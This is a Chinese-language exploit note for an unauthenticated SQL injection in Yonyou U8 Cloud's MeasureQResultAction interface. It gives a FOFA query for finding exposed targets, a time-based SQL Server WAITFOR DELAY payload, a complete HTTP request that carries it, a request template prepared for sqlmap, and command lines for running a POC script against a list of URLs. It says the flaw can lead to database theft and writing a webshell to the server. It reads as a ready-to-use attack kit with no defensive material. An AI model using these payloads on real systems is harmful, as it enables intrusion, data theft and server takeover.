## Y30-2用友-U8Cloud-SQL

漏洞描述：

用友U8 Cloud nc.ui.iufo.query.measurequery.MeasureQResultAction 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
fofa语法：

title=="U8C"

payload:

```
%27);WAITFOR+DELAY+%270:0:5%27--

语法为SQL server延时注入语句
```

```
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQResultAction&method=execute&selectQueryCondition=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```

![image-20240902193829541](C:\Users\yun\AppData\Roaming\Typora\typora-user-images\image-20240902193829541.png)

sqlmap:

```
GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQResultAction&method=execute&selectQueryCondition=1* HTTP/1.1
Host: *
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: *
x-forwarded-for: 127.0.0.1
Connection: close
```

![image-20240905192249321](C:\Users\yun\AppData\Roaming\Typora\typora-user-images\image-20240905192249321.png)

POC使用方式：

```
python3 1-U8Cloud-SQL.py -u url
python3 1-U8Cloud-SQL.py -f urls.txt
```

